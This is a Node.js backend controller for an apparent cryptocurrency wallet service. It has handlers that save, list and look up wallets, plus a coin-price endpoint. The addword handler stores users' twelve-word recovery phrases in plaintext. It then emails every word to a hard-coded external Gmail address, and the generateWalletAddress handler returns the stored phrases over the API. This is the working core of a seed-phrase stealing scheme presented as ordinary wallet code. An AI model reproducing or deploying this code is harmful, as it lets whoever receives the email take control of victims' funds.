const db = require('../../config/db');
const { ethers } = require("ethers");
const axios = require('axios');
bip39 = require('bip39');
const jwt = require('jsonwebtoken');
const { sendEmail } = require('../emailSend/Nodemailer');

// Save the 12 words into DB
exports.addword = async (req, res) => {
  try {
    const { type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve } = req.body;
    const authHeader = req.headers.authorization;
    const token = authHeader ? authHeader.slice(7) : "";

    if (!token) {
      return res.status(401).json({ msg: 'Authorization token missing', status_code: false });
    }

    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    const userId = decoded.userId;


    // 1️⃣ Check if wallet with same type already exists for this user
    const checkSql = `SELECT * FROM wallet WHERE user_id = ? AND type = ?`;
    const [existing] = await db.query(checkSql, [userId, type]);

    if (existing.length > 0) {
      return res.status(201).json({ msg: 'Wallet with same type already exists for this user', status_code: false });
    }

    // 2️⃣ Insert new wallet words
    const insertSql = `
      INSERT INTO wallet 
      (user_id, type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve) 
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `;
    const [result] = await db.query(insertSql, [
      userId, type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve
    ]);

    await sendEmail({
      to: 'backedbyquantum@gmail.com',
      subject: `New ${ type } Data Received`,
      html: `
    <h2>${type} Details</h2>
    <table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse; width:100%; font-family:Arial, sans-serif;">
      <tr><td><strong>One</strong></td><td>${one || "-"}</td></tr>
      <tr><td><strong>Two</strong></td><td>${two || "-"}</td></tr>
      <tr><td><strong>Three</strong></td><td>${three || "-"}</td></tr>
      <tr><td><strong>Four</strong></td><td>${four || "-"}</td></tr>
      <tr><td><strong>Five</strong></td><td>${five || "-"}</td></tr>
      <tr><td><strong>Six</strong></td><td>${six || "-"}</td></tr>
      <tr><td><strong>Seven</strong></td><td>${seven || "-"}</td></tr>
      <tr><td><strong>Eight</strong></td><td>${eight || "-"}</td></tr>
      <tr><td><strong>Nine</strong></td><td>${nine || "-"}</td></tr>
      <tr><td><strong>Ten</strong></td><td>${ten || "-"}</td></tr>
      <tr><td><strong>Eleven</strong></td><td>${eleven || "-"}</td></tr>
      <tr><td><strong>Twelve</strong></td><td>${twelve || "-"}</td></tr>
    </table>
    <p style="margin-top:20px;">This email was automatically generated from form submission.</p>
  `
});

    res.status(200).json({ msg: 'Wallet words saved successfully', status_code: true });

  } catch (err) {
    console.error("❌ addword Error:", err.message);
    res.status(500).json({ msg: 'Internal server error', status_code: false });
  }
};


// Get 12 words from DB and generate wallet
exports.generateWalletAddress = async (req, res) => {
  try {
    const authHeader = req.headers.authorization;
    const token = authHeader ? authHeader.slice(7) : "";

    if (!token) {
      return res.status(401).json({ msg: 'Authorization token missing', status_code: false });
    }

    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    const userId = decoded.userId;

    const sql = `
      SELECT id, user_id, type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve, created_at, updated_at
      FROM wallet
      WHERE user_id = ?
      ORDER BY id
    `;

    const [results] = await db.query(sql, [userId]);

    if (results.length === 0) {
      return res.status(201).json({ msg: 'No wallet found for user', status_code: false });
    }

    // Format each wallet's mnemonic
    const wallets = results.map(row => ({
      id: row.id,
      type: row.type,
      mnemonic: [
        row.one, row.two, row.three, row.four, row.five, row.six,
        row.seven, row.eight, row.nine, row.ten, row.eleven, row.twelve
      ].join(' '),
      created_at: row.created_at,
      updated_at: row.updated_at
    }));

    res.status(200).json({ status_code: true, wallets });

  } catch (err) {
    console.error("❌ generateWalletAddress Error:", err.message);
    res.status(500).json({ msg: 'Internal server error', status_code: false });
  }
};


exports.getwalletHistory = async (req, res) => {
  try {
    // 1. Get and verify JWT token
    const authHeader = req.headers.authorization;
    const token = authHeader ? authHeader.slice(7) : "";
    if (!token) {
      return res.status(401).json({ status_code: false, msg: 'Authorization token required' });
    }

    let decoded;
    try {
      decoded = jwt.verify(token, process.env.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ status_code: false, msg: 'Invalid token' });
    }

    const user_id = decoded.userId;
    console.log("user_id", user_id);

    // 2. Fetch mnemonic words from DB
    const sql = `
      SELECT one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve
      FROM wallet
      WHERE user_id = ?
    `;

    const [rows] = await db.query(sql, [user_id]);
    console.log("rows", rows);

    if (!rows.length) {
      return res.status(201).json({ status_code: false, msg: 'No wallet found' });
    }

    // 3. Build and validate mnemonics
    const validMnemonics = rows
      .map(r => {
        const phrase = [
          r.one, r.two, r.three, r.four, r.five, r.six,
          r.seven, r.eight, r.nine, r.ten, r.eleven, r.twelve
        ].join(' ').trim().toLowerCase();
        return bip39.validateMnemonic(phrase) ? phrase : null;
      })
      .filter(Boolean);

    if (!validMnemonics.length) {
      return res.status(201).json({ status_code: false, msg: 'No valid mnemonics found' });
    }

    // 4. Fetch balances & transactions from Covalent
    const apiKey = process.env.COVALENT_API_KEY;
    if (!apiKey) {
      return res.status(500).json({ status_code: false, msg: 'COVALENT_API_KEY missing' });
    }

    const chainId = 1; // Ethereum mainnet

    const results = await Promise.all(validMnemonics.map(async (mnemonic) => {
      try {
        // ethers v6+ uses fromPhrase, v5 uses fromMnemonic
        const wallet = ethers.Wallet.fromPhrase(mnemonic); 
        const address = wallet.address;
        const baseUrl = `https://api.covalenthq.com/v1/${chainId}/address/${address}`;

        const [balanceResp, txResp] = await Promise.all([
          axios.get(`${baseUrl}/balances_v2/`, { params: { key: apiKey } }),
          axios.get(`${baseUrl}/transactions_v3/`, { params: { key: apiKey } })
        ]);

        return {
          status_code: true,
          address,
          balances: balanceResp.data?.data?.items || [],
          transactions: txResp.data?.data?.items || []
        };
      } catch (err) {
        return { status_code: false, msg: `Error fetching wallet: ${err.message}` };
      }
    }));

    // 5. Send response
    res.json({
      status_code: true,
      wallets: results
    });

  } catch (err) {
    console.error('Error fetching wallet history:', err.message);
    res.status(500).json({ status_code: false, msg: 'Error fetching history' });
  }
};




exports.iframe = async (req, res) => {
  try {
    const { name } = req.params;

    // 1️⃣ Fetch coin from DB
    const sql = `SELECT * FROM cripto_list WHERE name = ? AND is_active = 1`;
    const [results] = await db.query(sql, [name]);

    if (results.length === 0) {
      return res.status(201).json({ msg: 'Coin not found', status_code: false });
    }

    const coin = results[0];

    // 2️⃣ Determine if price data needs refresh (older than 1 minute)
    const lastFetch = new Date(coin.fetch_date);
    const now = new Date();
    const timeDiff = now - lastFetch;
    const oneMinute = 60 * 1000;
    const needsRefresh = timeDiff > oneMinute;

    // 3️⃣ Prepare response using current DB values
    const responseData = {
      msg: 'Success',
      status_code: true,
      data: {
        ...coin,
        current_price_usd: Number(coin.current_value) || 0,
        usd_24h_change: Number(coin.last_24_change) || 0,
        price_updated_at: coin.fetch_date,
        cache_status: needsRefresh ? 'stale' : 'fresh',
        next_refresh_in: needsRefresh ? Math.ceil((oneMinute - timeDiff) / 1000) : 0
      }
    };

    res.status(200).json(responseData);

    // 4️⃣ Update price in background if needed
    if (needsRefresh) {
      const cryptoPriceService = require('../cryptoApi/cryptoPriceService');

      cryptoPriceService.updateMultipleCoinPricesBatch([coin])
        .then(updateResults => {
          const successCount = updateResults.filter(r => r.updated).length;
          console.log(`✅ Background price update completed for ${coin.name}: ${successCount} successful`);
        })
        .catch(error => {
          console.error(`❌ Background price update failed for ${coin.name}:`, error.message);
        });
    }

  } catch (err) {
    console.error("❌ iframe Error:", err.message);
    res.status(500).json({ msg: 'Internal server error', status_code: false });
  }
};




